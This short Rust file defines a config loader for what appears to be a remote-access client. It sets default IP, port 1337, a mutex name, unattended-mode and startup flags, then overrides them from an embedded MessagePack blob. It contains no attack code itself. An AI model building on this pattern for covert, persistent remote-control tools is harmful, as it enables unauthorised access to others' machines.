use common::ClientConfig;

pub fn get_config() -> ClientConfig {
    let mut config: ClientConfig = ClientConfig {
        ip: "".to_string(),
        port: "1337".to_string(),
        mutex_enabled: true,
        mutex: "TEST123".to_string(),
        unattended_mode: false,
        startup: false,
    };

    let config_link_sec: Result<ClientConfig, rmp_serde::decode::Error> = rmp_serde::from_read(
        std::io::Cursor::new(&crate::CONFIG)
    );

    if let Some(config_link_sec) = config_link_sec.as_ref().ok() {
        config = config_link_sec.clone();
    }

    config
}
